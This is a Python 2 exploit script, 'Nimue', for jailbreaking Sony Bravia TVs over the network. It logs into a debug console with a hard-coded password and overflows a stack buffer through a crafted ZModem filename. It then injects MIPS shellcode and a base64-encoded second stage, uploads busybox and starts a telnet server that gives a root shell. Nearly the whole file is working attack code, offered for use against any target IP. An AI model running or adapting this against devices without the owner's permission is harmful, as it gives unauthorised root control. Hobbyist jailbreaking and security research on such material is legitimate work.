#!/usr/bin/env python

# Nimue jailbreaking script for Sony Bravia TVs.
# Copyright (C) 2012 Sam Edwards
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import binascii
import struct
import socket
import sys
import time

def crc16(data):
    TABLE = """\
    AAAhEEIgYzCEQKVQxmDncAiBKZFKoWuxjMGt0c7h7/ExEhACczJSIrVSlEL3ctZiOZMYg3uzWqO9
    05zD//Pe42IkQzQgBAEU5mTHdKREhVRqpUu1KIUJle7lz/WsxY3VUzZyJhEWMAbXdvZmlVa0Rlu3
    eqcZlziH3/f+553XvMfESOVYhmineEAIYRgCKCM4zMnt2Y7pr/lIiWmZCqkrufVa1Eq3epZqcRpQ
    CjM6Eir929zLv/ue63mbWIs7uxqrpmyHfORMxVwiLAM8YAxBHK7tj/3szc3dKq0LvWiNSZ2XfrZu
    1V70ThM+Mi5RHnAOn/++793f/M8bvzqvWZ94j4iRqYHKseuhDNEtwU7xb+GAEKEAwjDjIARQJUBG
    cGdguYOYk/uj2rM9wxzTf+Ne87ECkBLzItIyNUIUUndiVnLqtculqJWJhW71T+Us1Q3F4jTDJKAU
    gQRmdEdkJFQFRNun+reZh7iXX+d+9x3HPNfTJvI2kQawFldmdnYVRjRWTNltyQ75L+nImemJirmr
    qURYZUgGeCdowBjhCII4oyh9y1zbP+se+/mL2Ju7q5q7dUpUWjdqFnrxCtAasyqSOi79D+1s3U3N
    qr2LreidyY0mfAdsZFxFTKI8gyzgHMEMH+8+/13PfN+br7q/2Y/4nxduNn5VTnReky6yPtEO8B4=
    """
    table = struct.unpack('<256H', binascii.a2b_base64(TABLE))
    crc = 0x0000
    for byte in data:
        crc = crc<<8
        crc ^= table[(crc>>16) ^ ord(byte)]
        crc &= 0xFFFF
    return crc

class ExploitException(Exception):
    def explain(self):
        sys.stderr.write('FAILURE: %s\n' % self.message)

class Exploit(object):
    CONSOLE_PORT = 12345
    CONSOLE_PASSWORD = 'gemstar'

    FILESYSTEM_ROOT = '/tvgos'
    EXPLOIT_PATH = '/RW/exploit'
    EMPTY_DIRECTORY = '/RW/lost+found'

    BUSYBOX_PATH = 'busybox/busybox'

    STAGE2 = binascii.a2b_base64("""
    JkAIAcEBCyX//2slBAEIJQQCDTFw/wgl/v8RBSSAEAI4/+knIVhpAQQBbI0EAS6NJnDMAQQBLq0h
    SC0BI3hpAfr/4B0mIeADQQQFJAGApjAzEAIkDAEBASSAEAL9ap94/JEzW/2RIl/cIcJcX54ge/GR
    Il/zkWJP/ZEiX9WUn3jNkZTQ0ZGX0NWRltDZkZHQ3ZGQ0J2Dn3jtkZ7QxZSd0MmUk9DNlJLQ9ZHC
    XL2Un3j/kSZ73LmiX9yhIl+qgSB78ZEiX8GRYk/cEWJf3LEiXWmQ53ntkSR7tIEge/GRIl/IkWJL
    3LEiXfyRJ3uzgSB78ZEiX82RYkvcsSJd3LkiX9yhIl+1gSB78ZEiX9eRYk/cGWJfjZDmefyQJ3sQ
    kCR7WJ4ge/GRIl/ekWJP3AFiX/1un3jcsQJd3LmCXP2QJHteniB78ZEiX/uRYk/csWJd3LmCXNyh
    Yl9ZniB78ZEiXwluIk9bniB78ZEiX9yxAl1bniB78ZEiX9yxIl1bniB78ZEiX42Q5nncuYJcfJDq
    ee+RK3r9kYrw/pEqet7BCl4BbmJC+ZGfeP2RgvDcoSJfVp4ge/GRIl/XkSZ7XJ4ge/GRIl9ZkOZ5
    u4Ege/GRIl8EbiJP/ZEiX9LmSzua9FZw0/NXLITzTSf9/0Ff0P0ico2RG2v9vEdfnOJKX/+RMGv9
    kSJf/ZEiX/2RIl/3kSJf/ZEiX/2RIl/9kSJf/ZEiXw==
    """)
    STAGE2_PORT_UPLOAD = 4660
    STAGE2_PORT_SHELL = 94

    TELNET_SETUP_COMMANDS = (
        'cp -r /dev /widget\n'
        'mount -t ramfs none /dev\n'
        'mv /widget/dev/* /dev\n'
        'mv /widget/dev /dev/pts\n'
        'mount -t devpts none /dev/pts\n'
        'mknod /dev/ptmx c 5 2\n'
        'cd /root\n'
        'telnetd -lash\n'
        'exit\n'
    )

    PADPATH_LENGTH = 64
    STACK_DEPTH_PATH = 0x420
    STACK_DEPTH_RA = 0x08

    MAX_CONSOLE_COMMAND = 255
    MAX_ZMODEM_FILENAME = 1000
    CONSOLE_BADCHARS = '\x00\x06\x07\x08\t\n\r\x1b\x1c\x1d"\\~\x7f'
    ZMODEM_BADCHARS = '\x00\x18'

    STAGE1 = ('6088EA27' # addiu $t2, $ra, -30624
              'C877498D' # lw $t1, 30664($t2)
              '21FF2939' # xori $t1, $t1, 0xFF21
              'C87749AD' # sw $t1, 30664($t2)
              '2621E003' # xor $a0, $ra, $0
              '41040524' # addiu $a1, $0, 0x0441
              '0180A630' # andi $a2, $a1, 0x8001
              '33100224' # addiu $v0, $0, __NR_cacheflush
              '0C010101' # syscall
              '24801002' # nop
              '29FFA003' # jr $sp [xored by 0xFF21]
              '24801002' # nop
             ).decode('hex')

    FDP_FILENAME_BUFFER = 0x2BB8664C # Works on aa0195fn - any other firmwares?
    ADDR_RETURN_OVERRIDE = (FDP_FILENAME_BUFFER + PADPATH_LENGTH -
                            len(FILESYSTEM_ROOT + '/'))
    # This is necessary to make sure ADDR_RETURN_OVERRIDE falls on a 4-byte
    # boundary.
    STAGE1_PAD = 4-ADDR_RETURN_OVERRIDE%4
    ADDR_RETURN_OVERRIDE += STAGE1_PAD

    def __init__(self, ip):
        self.ip = ip
        self.sock = None

    @classmethod
    def check_chars(cls, teststring, charset=ZMODEM_BADCHARS):
        return not any(char in charset for char in teststring)

    def do_step(self, step, func, *args, **kwargs):
        sys.stderr.write('%s... ' % step)
        func(*args, **kwargs)
        sys.stderr.write('OK\n')

    def run(self):
        try:
            self.do_step('Preparing', self.prepare)
            self.do_step('Connecting', self.connect, self.CONSOLE_PORT)
            self.do_step('Logging in', self.send_password)
            self.do_step('Creating exploit directory', self.create_dir)
            self.do_step('Creating padding directory', self.create_pad)
            self.do_step('Switching zmodem mode', self.zmodemmode)
            self.do_step('Injecting stage1', self.inject_stage1)
            self.do_step('Injecting stage2 and overflowing buffer',
                         self.overflow_buffer)
            self.do_step('Giving stage2 a moment to set up', time.sleep, 0.5)
            self.do_step('Connecting to stage2\'s port', self.connect,
                         self.STAGE2_PORT_UPLOAD)
            self.do_step('Uploading busybox', self.upload_busybox)
            self.do_step('Giving busybox a moment to start', time.sleep, 2.0)
            self.do_step('Connecting to busybox', self.connect,
                         self.STAGE2_PORT_SHELL)
            self.do_step('Setting up Telnet server', self.setup_telnet)
            self.do_step('Testing Telnet server', self.connect, 23)
            self.victory()
        except ExploitException, e:
            e.explain()
            sys.exit(1)

    def prepare(self):
        self.padlength = self.PADPATH_LENGTH - len(self.FILESYSTEM_ROOT + '/' +
                                                   self.EXPLOIT_PATH + '//')
        if self.padlength < 1: raise ExploitException('EXPLOIT_PATH too long!')

        stage2_depth = self.STACK_DEPTH_RA + len(self.STAGE2)
        zmodem_pad = (self.STACK_DEPTH_PATH - self.PADPATH_LENGTH -
                      stage2_depth)

        # Check the stage1...
        if not self.check_chars(self.STAGE1, self.CONSOLE_BADCHARS+' '):
            raise ExploitException('STAGE1 has some invalid characters!')
        if len(self.STAGE1) % 4 != 0:
            raise ExploitException('STAGE1 not aligned properly!')

        # Check the stage2...
        if zmodem_pad < 0: raise ExploitException('STAGE2 too large!')
        if not self.check_chars(self.STAGE2):
            raise ExploitException('STAGE2 has some invalid characters!')
        if len(self.STAGE2) % 4 != 0:
            raise ExploitException('STAGE2 not aligned properly!')

        # Establish the zmodem filename (goes onto the stack directly, contains
        # stage2 as well, and a relative-branch at the end to execute it)
        self.zmodem = ('x'*zmodem_pad + self.STAGE2 +
                       struct.pack('<I', self.ADDR_RETURN_OVERRIDE) +
                       'x'*(self.STACK_DEPTH_RA-4) +
                       struct.pack('<h', -1-stage2_depth/4) + '\xff\x13'
                       '\x24\x80\x10\x02')
        if not self.check_chars(self.zmodem):
            raise ExploitException('ZModem filename has some bad chars')
        if len(self.zmodem) > self.MAX_ZMODEM_FILENAME:
            raise ExploitException('ZModem filename too long; '
                                   'increase PADPATH_LENGTH?')

        try:
            self.busybox = open(self.BUSYBOX_PATH, 'rb')
        except IOError:
            raise ExploitException('unable to open BUSYBOX_PATH!')

    def connect(self, port):
        if self.sock is not None: self.sock.close()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10.0)
        try:
            self.sock.connect((self.ip, port))
        except socket.error, e:
            raise ExploitException(e.strerror)

    def send_password(self):
        try:
            self._send('\n' + self.CONSOLE_PASSWORD + '\n')
        except socket.error:
            raise ExploitException('Guide did not accept password!')

    def create_dir(self):
        self.cd('/')
        self.rm(self.EXPLOIT_PATH)
        self.cp(self.EMPTY_DIRECTORY, self.EXPLOIT_PATH)
        self.cd(self.EXPLOIT_PATH)

    def create_pad(self):
        self.cp(self.EMPTY_DIRECTORY, 'empty')
        self.cp('empty', 'x'*self.padlength)
        self.cd('x'*self.padlength)

    def zmodemmode(self):
        if self.execute('zmodemmode 1') != 'Mode changed to: Host\r\n':
            raise ExploitException('Unexpected response!')

    def inject_stage1(self):
        self.execute('fdp file %s%s' % ('x'*self.STAGE1_PAD, self.STAGE1))

    def overflow_buffer(self):
        header = '\x2a\x18\x41\x04\x00\x00\x00\x00\x89\x06'
        data = self.zmodem + '\x00\x00'
        cksum = struct.pack('>H', crc16(data + 'k'))
        self.sock.send('rz\n' + header + data + '\x18k' + cksum + '\x11')

    def upload_busybox(self):
        while True:
            data = self.busybox.read(1024*20)
            if not data: break
            self.sock.sendall(data)
        self.busybox.close()
        self.sock.close()

    def setup_telnet(self):
        self.sock.sendall(self.TELNET_SETUP_COMMANDS)
        d = self.sock.recv(1024)
        self.sock.close()
        if d:
            raise ExploitException('unexpected reply - telnet may still work')

    def victory(self):
        self.sock.close()
        sys.stderr.write("""\

********************************************************************************
****************************** EXPLOIT SUCCESSFUL ******************************
********************************************************************************
* You may now connect to the TV on port 23 using any standard Telnet client to *
* access a root shell. To stop the Telnet server, simply restart the TV.       *
********************************************************************************

""")

    def cd(self, directory):
        if not self.execute('cd %s' % directory).endswith(directory + '\r\n'):
            raise ExploitException('cd command failed')

    def cp(self, src, dest):
        result = self.execute('cp %s %s' % (src, dest))
        if not (result.startswith('OK ') and result.endswith(' copied\r\n')):
            raise ExploitException('cp command failed')

    def rm(self, target):
        self.execute('rm %s 1' % target)

    def execute(self, cmd):
        if len(cmd) > self.MAX_CONSOLE_COMMAND:
            raise ExploitException('Tried to send oversized console command!')
        if not self.check_chars(cmd, self.CONSOLE_BADCHARS):
            raise ExploitException('Tried to send console command that '
                                   'contained some bad characters!')
        try:
            return self._send(cmd + '\n')
        except socket.timeout:
            raise ExploitException('Timeout while executing console command!')

    def _send(self, data):
        self.sock.send(data)
        buf = ''
        while True:
            x = self.sock.recv(1)
            if not x:
                raise ExploitException('TV unexpectedly closed connection')
            buf += x
            if self.check_prompt(buf[-13:]):
                return buf[:-13].split('\r\n',1)[1]

    @classmethod
    def check_prompt(cls, prompt):
        LOWER = '0d.00:00:00> '
        UPPER = '9d.29:59:59> '
        if len(prompt) < 13: return False
        for n,c in enumerate(prompt[:13]):
            if not (ord(LOWER[n]) <= ord(c) <= ord(UPPER[n])):
                return False
        return True


if __name__ == '__main__':
    if len(sys.argv) < 2:
        sys.stderr.write('Usage: %s TARGET\n' % sys.argv[0])
    else:
        nimue = Exploit(sys.argv[1])
        nimue.run()
